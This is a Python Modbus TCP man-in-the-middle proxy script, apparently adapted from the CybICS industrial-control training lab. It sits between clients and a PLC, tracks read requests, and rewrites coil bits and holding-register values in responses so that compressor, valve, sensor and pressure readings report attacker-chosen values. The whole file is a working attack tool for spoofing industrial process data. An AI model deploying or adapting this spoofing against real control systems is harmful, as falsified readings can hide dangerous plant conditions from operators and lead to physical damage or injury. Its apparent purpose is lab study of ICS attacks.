"""
This version on the MITM script is customized to implement a session-aware
functionnality on coil and holding reading for having more control on
registry-read spoofing and allowing finer attacks.

The attack flow is the following:

    1- A request for reading coils values (function 0x01) is sent.

    2- The script identify the future position of to-be-modified bit position
       in the future answer.

    3- A mapping of theses addreses is stored in a queue (assuming controllers
       uses a non-asychronous FIFO method, should be modified for being
       session-code dependant).

    4- A response to 0x01 is sent.

    5- The response is intercepted, and target bits are changed accordingly to
       the constant `TARGET_COIL_VALUES`.

Same process can be applied for HOLDING registers.

Modifications done by [pierls](https://github.com/pierls), based on [cybICS MITM script](https://github.com/mniedermaier/CybICS)
"""

import socket
import threading
from colorama import Fore
import signal
import os

# Proxy settings
PROXY_HOST = '0.0.0.0'   # The address to bind the proxy on

# The port to expose for Modbus traffic (standard Modbus TCP port is 502)
PROXY_PORT = 5020

MODBUS_SERVER_HOST = '172.17.0.1'  # Address of the real Modbus server (PLC)
MODBUS_SERVER_PORT = 502    # Port of the real Modbus server

BUFFER_SIZE = 1024  # Buffer size for receiving data

# modbus constants
COIL_DATA_OFFSET = 10  # in bytes
HOLDING_DATA_OFFSET = 10  # in bytes

# TP coil PYSICAL registers addresses
COIL_COMPRESSOR = 1
COIL_SYS_VALV = 2

# TP coil HOLDING registrers addresses
GST = 1124
HPT = 1126
SYS_SENSOR = 1132
BLOW_SENSOR = 1134
MAN = 1130


########## CUSTOM SCRIPT VALUES ##########
#                                        #
#  Can be modified to interact with ev-  #
#  ery coil and holdings registers.      #
#                                        #
##########################################

# Wanted coil spoofed values,
TARGET_COIL_VALUES = {
    COIL_COMPRESSOR: 1,  # bool but written in INT
    COIL_SYS_VALV: 1
}

# wanted holding spoofed values
TARGET_HOLDING_VALUES = {
    SYS_SENSOR: 1,  # In INT
    GST: 200,
    HPT: 95,
    MAN: 0
}

# global values
global_coil_status = []
global_holding_status = []

# to be closed properly at the end
client_socket = None
server_socket = None


def manipulate_request(data):
    """
    Intercept and modify the Modbus request as needed.
    Example: Intercept a read holding register request (Function code 0x03)
    and modify the address.
    """
    print("[*] Original Modbus Request: ", data)

    # Simple Example: If it's a read holding register (function code 0x03)
    if data[7] == 0x03:  # Function code is at the 8th byte in Modbus TCP
        intercept_holding_values(data=data)

    if data[7] == 0x01:
        # Attempt to read coil values

        intercept_coil_values(data=data)

    return data


def intercept_holding_values(data):
    """
    Handle holding READ requests.
    """
    global global_holding_status
    data = bytearray(data)
    print(f"{Fore.LIGHTCYAN_EX} Intercepting attempt holding read ({data}){Fore.RESET}")

    addresses = get_selected_holdings(data)

    # Append data even if no addresses needs to be modified to keep
    # modbus sessions track.
    global_holding_status.append(addresses)
    print(f"queue: {global_holding_status}")


def intercept_coil_values(data):
    """
    Handle coil READ requests.
    """
    global global_coil_status
    data = bytearray(data)
    print(f"{Fore.LIGHTCYAN_EX} Intercepting attempt coil read ({data}) {Fore.RESET}")

    addresses = get_selected_coils(data)

    # Append data even if no addresses needs to be modified to keep
    # modbus sessions track.
    global_coil_status.append(addresses)
    print(f"queue: {global_coil_status}")


def get_selected_holdings(data):
    """
    Get a mapping of thet targeted holding positions in the future response.
    """
    results = {}
    addresses_requeteds = []
    cpt = 0
    starting_address = int.from_bytes(data[8:10])
    number_of_holdings = int.from_bytes(data[10:12])
    print(f"Pysical address start: {starting_address} ({data[8:10]})")
    print(f"Number of coils: {number_of_holdings} ({data[10:12]})")
    for i in range(starting_address, starting_address+number_of_holdings):
        addresses_requeteds.append(i)

    for i in addresses_requeteds:
        if TARGET_HOLDING_VALUES.get(i) is not None:
            print(f"{Fore.GREEN} Intercepted {i}, with value at {cpt}! {Fore.RESET}")
            results[i] = cpt
        cpt += 1

    return results


def manipulate_holdings_read_response(data):
    """
    Get a READ reponse and modify it accordingly to the oldest recorded
    session in the `global_holding_status`. Return the modified packet data.
    """
    global global_holding_status
    data = bytearray(data)

    if len(global_holding_status) == 0:
        print(f"{Fore.RED}[!] Asynchronous response{Fore.RESET}")

        return data

    current_session = global_holding_status[0]

    for entry, location in current_session.items():
        desired_value = TARGET_HOLDING_VALUES[entry]

        # in BYTES x2 beacause standard data bloc is 2 bytes long
        offset_location = HOLDING_DATA_OFFSET+location*2

        desired_bytes = desired_value.to_bytes(2, 'little')
        data[offset_location] = desired_bytes[0]
        data[offset_location+1] = desired_bytes[1]

    # removing the item from the queue
    global_holding_status.pop(0)
    return data


def get_selected_coils(data):
    """
    Get a mapping of the targeted coils position in the future response.
    """
    results = {}
    addresses_requeteds = []
    cpt = 0
    starting_address = int.from_bytes(data[8:10])
    number_of_coils = int.from_bytes(data[10:12])

    print(f"Pysical address start: {starting_address} ({data[8:10]})")
    print(f"Number of coils: {number_of_coils} ({data[10:12]})")
    for i in range(starting_address, starting_address+number_of_coils):
        addresses_requeteds.append(i)

    for i in addresses_requeteds:
        if TARGET_COIL_VALUES.get(i) is not None:
            print(f"{Fore.GREEN} Intercepted {i}, with value at {cpt}! {Fore.RESET}")
            results[i] = cpt
        cpt += 1

    return results


def manipulate_coil_read_response(data):
    """
    Get a READ reponse and modify it accordingly to the oldest recorded
    session in the `global_coil_status`. Return the modified packet data.
    """
    global global_coil_status
    data = bytearray(data)

    if len(global_coil_status) == 0:
        print(f"{Fore.RED}[!] Asynchronous response{Fore.RESET}")

        return data

    current_session = global_coil_status[0]

    for entry, location in current_session.items():
        desired_value = TARGET_COIL_VALUES[entry]

        offset_location = (location + COIL_DATA_OFFSET*8)
        """
        Defined in BITS
        """

        targeted_bit_index = (offset_location // 8)-1

        subbyte_index = offset_location % 8

        byte_of_interest = data[targeted_bit_index]

        bit = (byte_of_interest >> subbyte_index) & 1

        if bit == desired_value:
            continue
        else:
            if bit is True:
                byte_of_interest = byte_of_interest & ~(1 << subbyte_index)
            else:
                byte_of_interest = byte_of_interest | (1 << subbyte_index)

        data[targeted_bit_index] = byte_of_interest

    # removing the item from the queue
    global_coil_status.pop(0)
    return data


def manipulate_response(data):
    """
    Intercept and modify the Modbus response as needed.
    Example: Change a value in the response.
    """
    print("[*] Original Modbus Response: ", data)

    # Example: If it's a response to a read holding register request (function code 0x03)
    if data[7] == 0x03:  # Function code 0x03 (response)
        print(
            f"{Fore.LIGHTCYAN_EX} Intercepting holding read reponse ({data}) {Fore.RESET}"
            )

        modified_data = manipulate_holdings_read_response(data=data)
        print(f"{Fore.LIGHTGREEN_EX} Modified data: {modified_data} {Fore.RESET}")

        return bytes(modified_data)

    if data[7] == 0x01:
        print(
            f"{Fore.LIGHTCYAN_EX} Intercepting coil read reponse ({data}) {Fore.RESET}"
            )

        modified_data = manipulate_coil_read_response(data=data)
        print(f"{Fore.LIGHTGREEN_EX} Modified data: {modified_data} {Fore.RESET}")

        return bytes(modified_data)

    return data


def handle_modbus_client(client_socket):
    """
    Handle communication with the Modbus client.
    """
    # Connect to the real Modbus server
    global server_socket
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.connect((MODBUS_SERVER_HOST, MODBUS_SERVER_PORT))
    print(f"[*] Modbus Proxy connected to real Modbus server")

    try:
        while True:
            # Receive Modbus request from client
            client_request = client_socket.recv(BUFFER_SIZE)
            if not client_request:
                break

            # Optionally manipulate the request before sending it to the real server
            manipulated_request = manipulate_request(client_request)

            # Forward the request to the real Modbus server
            server_socket.send(manipulated_request)

            # Receive the response from the real Modbus server
            server_response = server_socket.recv(BUFFER_SIZE)

            # Optionally manipulate the response before sending it back to the client
            manipulated_response = manipulate_response(server_response)

            # Send the manipulated response back to the client
            client_socket.send(manipulated_response)

    except Exception as e:
        print(f"[!] Error handling Modbus communication: {e}")

    finally:
        client_socket.close()
        server_socket.close()


def start_modbus_proxy():
    """
    Start the Modbus TCP proxy that listens for incoming Modbus clients.
    """
    proxy_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    proxy_socket.bind((PROXY_HOST, PROXY_PORT))
    proxy_socket.listen(5)
    print(f"[*] Modbus Proxy listening on {PROXY_HOST}:{PROXY_PORT}")

    global client_socket
    while True:
        # Accept incoming connection from Modbus client
        client_socket, addr = proxy_socket.accept()
        print(f"[*] Accepted connection from {addr}")

        # Handle the client in a new thread
        client_thread = threading.Thread(target=handle_modbus_client, args=(client_socket,))
        client_thread.start()


def signal_handler(sig, frame):
    """
    Defined to try having a proper socket closing at then end.
    """
    global server_socket
    global client_socket
    print(f"{Fore.GREEN}[i] Shutting down...{Fore.RESET}")
    server_socket.close()
    client_socket.close()
    print(f"{Fore.GREEN}[+] Goodbye!{Fore.RESET}")

    os._exit(0)


if __name__ == "__main__":
    # To avoid handling multiple threads shutdown by hand
    signal.signal(signal.SIGINT, signal_handler)

    start_modbus_proxy()